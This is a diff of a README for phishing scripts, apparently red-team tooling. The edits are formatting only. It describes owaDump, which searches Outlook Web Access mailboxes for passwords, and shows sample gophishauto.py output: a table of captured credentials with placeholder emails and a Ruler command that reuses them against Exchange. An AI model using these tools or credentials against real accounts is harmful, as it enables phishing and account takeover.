@@ -9,7 +9,8 @@ Some miscellaneous phishing scripts
 | owaDump<br>https://github.com/milo2012/owaDump | Logins into Outlook Web Access servers and search Email Accounts (OWA) for Passwords, PAN numbers as well as other Keywords|
   
   
-** Sample output from gophishauto.py **  
+  
+*** Sample output from gophishauto.py ***
 ```
 $  python gophishauto3.py -a 212345436346 -i 192.168.0.181 -p 3333 --ssl -n 14 
 
@@ -25,8 +26,8 @@ Credentials Captured: 2 (20%)
 [+] Credentials Captured from Gophish
 Email                               Username                            Password
 ----------------------------------  ----------------------------------  ------------
-xxx@yahoo.com     					xxx@yahoo.com      					Password1
-yyy@yahoo.com   					yyy@yahoo.com   					Password1
+xxx@yahoo.com     		    xxx@yahoo.com    			Password1
+yyy@yahoo.com   		    yyy@yahoo.com   			Password1
 
 [+] Ruler
 ./ruler-osx64   --email xxx@yahoo.com -u xxx@yahoo.com -p 'Password1' c
